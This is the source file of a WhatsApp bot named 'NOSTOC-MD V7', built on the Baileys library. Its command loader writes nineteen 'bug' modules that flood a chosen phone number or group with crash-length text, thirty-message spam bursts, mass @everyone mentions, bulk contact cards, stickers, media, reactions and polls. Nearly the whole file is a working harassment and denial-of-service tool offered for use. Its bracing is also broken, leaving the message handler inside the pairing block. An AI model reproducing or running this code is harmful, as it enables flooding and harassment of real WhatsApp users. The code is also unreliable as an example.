import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import 'dotenv/config';
import makeWASocket, { useMultiFileAuthState, DisconnectReason, Browsers, delay, proto } from '@whiskeysockets/baileys';
import pino from 'pino';
import express from 'express';
import chalk from 'chalk';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ===== NOSTOC V7 ULTIMATE CONFIG =====
const BOT_NAME = "NOSTOC-MD";
const VERSION = "V7.0.0";
const OWNER = "Nostoc";
const PREFIX = "!";
const OWNER_NUMBER = process.env.OWNER_NUMBER || "234XXXXXXXXXX";
const PHONE_NUMBER = process.env.PHONE_NUMBER || "234XXXXXXXXXX";

const THEME = {
    banner: `\n[VIGILANT SYSTEM // ${VERSION} ULTIMATE]\n> COLD STORAGE ENGINE INITIALIZED\n> OPERATOR: ${OWNER.toUpperCase()}\n----------------------------------------`,
    prefix: `[NOSTOC://V7]`,
    line: `----------------------------------------`
};

const app = express();
app.get('/', (req,res) => res.send(`${BOT_NAME} ${VERSION} ULTIMATE IS ONLINE ✅ by ${OWNER}`));

const commands = new Map();
const cooldowns = new Map();
let sock;

// 1. DYNAMIC COMMAND LOADER + 20 BUGS
async function loadCommands() {
    const commandsDir = path.join(__dirname, 'commands');
    if (!fs.existsSync(commandsDir)) fs.mkdirSync(commandsDir);

    const defaultCmds = {
        'menu.js': `export default { name: 'menu', cooldown: 2000, execute: (a,s,bn,v,c,st) => { const ping = Date.now()-st; return \`╭─── \${bn} \${v} ULTIMATE ───╮
│ Creator: \${c} | Speed: \${ping}ms
│ 20 BUGS LOADED
│!bug !spam !delay !stickerbug !gcbug
│!vnbug !contactbug !docbug !locationbug
│!buttonbug !listbug !reactbug !forwardbug
│!pollbug !statusbug !callbug !imagebug
│!videobug !gifbug !owner
╰───────────────────╯\`; }};`,
        'ping.js': `export default { name: 'ping', cooldown: 1000, execute: (a,s,bn,v,c,st) => { return \`*NOSTOC V7 SPEED* \n\${Date.now()-st}ms ⚡ ULTIMATE\`; }};`,
        'owner.js': `export default { name: 'owner', cooldown: 5000, execute: () => { return \`*OPERATOR: NOSTOC*\nwa.me/234XXXXXXXXXX\nV7 ULTIMATE COLD STORAGE\`; }};`,

        // 1. CRASH
        'bug.js': `export default { name: 'bug', cooldown: 10000, execute: async (a,s,bn,v,c,st,sock) => { const t = a[0]?a[0]+'@s.whatsapp.net':s; await sock.sendMessage(t,{text:'NOSTOC-V7-CRASH '.repeat(5000)}); return \`V7 CRASH SENT TO \${a[0]||'YOU'}\`; }};`,
        // 2. SPAM
        'spam.js': `export default { name: 'spam', cooldown: 15000, execute: async (a,s,bn,v,c,st,sock) => { const [t,...m]=a; if(!t)return'Usage:!spam 234xxx text'; const j=t+'@s.whatsapp.net'; for(let i=0;i<30;i++){await sock.sendMessage(j,{text:\`\${m.join(' ')||'NOSTOC-SPAM'} [\${i+1}/30]\`});await delay(80);} return \`V7 SPAMMED \${t} x30\`; }};`,
        // 3. DELAY
        'delay.js': `export default { name: 'delay', cooldown: 10000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; await sock.sendMessage(t,{text:'V7 Loading...'});await delay(25000);await sock.sendMessage(t,{text:'NOSTOC V7 DELAY BUG'}); return \`V7 DELAY SENT\`; }};`,
        // 4. STICKER
        'stickerbug.js': `export default { name: 'stickerbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<15;i++)await sock.sendMessage(t,{sticker:{url:'https://i.imgur.com/large-sticker.webp'}}); return \`V7 STICKER BUG x15\`; }};`,
        // 5. GC
        'gcbug.js': `export default { name: 'gcbug', cooldown: 30000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@g.us':s; await sock.sendMessage(t,{text:'@everyone '.repeat(300)+'NOSTOC-V7-GC'}); return \`V7 GC BUG\`; }};`,
        // 6. VOICENOTE
        'vnbug.js': `export default { name: 'vnbug', cooldown: 25000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<8;i++)await sock.sendMessage(t,{audio:{url:'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3'},mimetype:'audio/mp4',ptt:true}); return \`V7 VN BUG x8\`; }};`,
        // 7. CONTACT
        'contactbug.js': `export default { name: 'contactbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; const contacts=[]; for(let i=0;i<100;i++)contacts.push({displayName:'NOSTOC-BUG',vcard:'BEGIN:VCARD\\nVERSION:3.0\\nFN:NOSTOC\\nTEL:+234000000\\nEND:VCARD'}); await sock.sendMessage(t,{contacts:{contacts}}); return \`V7 CONTACT BUG x100\`; }};`,
        // 8. DOC
        'docbug.js': `export default { name: 'docbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<8;i++)await sock.sendMessage(t,{document:{url:'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf'},mimetype:'application/pdf',fileName:'NOSTOC-V7.pdf'}); return \`V7 DOC BUG x8\`; }};`,
        // 9. LOCATION
        'locationbug.js': `export default { name: 'locationbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<10;i++)await sock.sendMessage(t,{location:{degreesLatitude:0,degreesLongitude:0,name:'NOSTOC-V7-BUG'}}); return \`V7 LOCATION BUG x10\`; }};`,
        // 10. BUTTON
        'buttonbug.js': `export default { name: 'buttonbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{text:'NOSTOC-V7-BUTTON',footer:'BUG',buttons:[{buttonId:'1',buttonText:{displayText:'BUG' },type:1},{buttonId:'2',buttonText:{displayText:'BUG'},type:1}]}); return \`V7 BUTTON BUG x5\`; }};`,
        // 11. LIST
        'listbug.js': `export default { name: 'listbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{text:'NOSTOC-V7-LIST',footer:'BUG',buttonText:'CLICK',sections:[{title:'BUG',rows:[{title:'BUG',rowId:'1'},{title:'BUG',rowId:'2'}]}]}); return \`V7 LIST BUG x5\`; }};`,
        // 12. REACT
        'reactbug.js': `export default { name: 'reactbug', cooldown: 15000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; const msg=await sock.sendMessage(t,{text:'NOSTOC-V7-REACT'}); for(let i=0;i<20;i++)await sock.sendMessage(t,{react:{text:'💥',key:msg.key}}); return \`V7 REACT BUG x20\`; }};`,
        // 13. FORWARD
        'forwardbug.js': `export default { name: 'forwardbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; const msg=await sock.sendMessage(t,{text:'NOSTOC-V7-FORWARD'}); for(let i=0;i<10;i++)await sock.sendMessage(t,{forward:msg}); return \`V7 FORWARD BUG x10\`; }};`,
        // 14. POLL
        'pollbug.js': `export default { name: 'pollbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{poll:{name:'NOSTOC-V7-POLL',values:['BUG','BUG','BUG']}}); return \`V7 POLL BUG x5\`; }};`,
        // 15. STATUS
        'statusbug.js': `export default { name: 'statusbug', cooldown: 30000, execute: async (a,s,bn,v,c,st,sock) => { await sock.sendMessage('status@broadcast',{text:'NOSTOC-V7-STATUS-BUG '.repeat(100)}); return \`V7 STATUS BUG\`; }};`,
        // 16. CALL
        'callbug.js': `export default { name: 'callbug', cooldown: 60000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<3;i++)await sock.sendMessage(t,{text:'@'+t.split('@')[0]+' CALLING YOU',mentions:[t]}); return \`V7 CALL BUG\`; }};`,
        // 17. IMAGE
        'imagebug.js': `export default { name: 'imagebug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<10;i++)await sock.sendMessage(t,{image:{url:'https://picsum.photos/2000/2000'},caption:'NOSTOC-V7-IMAGE'}); return \`V7 IMAGE BUG x10\`; }};`,
        // 18. VIDEO
        'videobug.js': `export default { name: 'videobug', cooldown: 25000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{video:{url:'https://www.w3schools.com/html/mov_bbb.mp4'},caption:'NOSTOC-V7-VIDEO'}); return \`V7 VIDEO BUG x5\`; }};`,
        // 19. GIF
        'gifbug.js': `export default { name: 'gifbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<8;i++)await sock.sendMessage(t,{video:{url:'https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.mp4'},gifPlayback:true,caption:'NOSTOC-V7-GIF'}); return \`V7 GIF BUG x8\`; }};`
    };

    for(const [name, code] of Object.entries(defaultCmds)) {
        if (!fs.existsSync(path.join(commandsDir, name))) {
            fs.writeFileSync(path.join(commandsDir, name), code);
        }
    }

    const commandFiles = fs.readdirSync(commandsDir).filter(file => file.endsWith('.js'));
    for (const file of commandFiles) {
        try {
            const module = await import(`file://${path.join(commandsDir, file)}`);
            if (module.default && module.default.name) commands.set(module.default.name, module.default);
        } catch (error) { console.error(`> ERROR: ${file}`); }
    }
}

function isSpamming(sender, commandName, cooldownMs) {
    if (!cooldowns.has(commandName)) cooldowns.set(commandName, new Map());
    const now = Date.now(); const timestamps = cooldowns.get(commandName);
    if (timestamps.has(sender)) { const exp = timestamps.get(sender) + cooldownMs; if (now < exp) return Math.ceil((exp - now) / 1000); }
    timestamps.set(sender, now); return 0;
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    sock = makeWASocket({ 
    auth: state, 
    browser: [BOT_NAME, "Desktop", VERSION], 
    printQRInTerminal: false, 
    logger: pino({ level: 'silent' }) 
});

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if(connection === 'open') console.log(chalk.green(`${BOT_NAME} ${VERSION} ULTIMATE Connected ✅`));
        if(connection === 'close') { if(lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) startBot(); }
    });
    if (!state.creds.registered) { await delay(2000); try {
    const code = await sock.requestPairingCode(PHONE_NUMBER)
    console.log(`🔑 V7 PAIRING CODE: ${code}`)
} catch (e) {
    console.log("Pairing failed, retrying in 5s...")
    setTimeout(() => startBot(), 5000)
}
    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0]; if(!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid; const sender = msg.key.participant || from;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || ''; if(!text.startsWith(PREFIX)) return;
        const st = Date.now(); const tokens = text.slice(PREFIX.length).trim().split(/ +/); const cmd = tokens.shift().toLowerCase();
        if (!commands.has(cmd)) return;
        const command = commands.get(cmd); const cd = command.cooldown || 2000;
        const timeLeft = isSpamming(sender, cmd, cd); if (timeLeft > 0) return await sock.sendMessage(from, { text: `${THEME.prefix}\n> RATE_LIMIT: ${timeLeft}s` });
        try { const result = await command.execute(tokens, sender, BOT_NAME, VERSION, OWNER, st, sock); await sock.sendMessage(from, { text: `${THEME.prefix}\n${THEME.line}\n${result}\n${THEME.line}` }); } 
        catch (error) { await sock.sendMessage(from, { text: `${THEME.prefix}\n> ERROR: ${error.message}` }); }
    });
}

(async () => { console.log(THEME.banner); await loadCommands(); console.log(`> V7 ULTIMATE: Loaded ${commands.size} modules`); startBot(); })();
const PORT = process.env.PORT || 3000; app.listen(PORT, () => console.log(`> V7 Web server running`));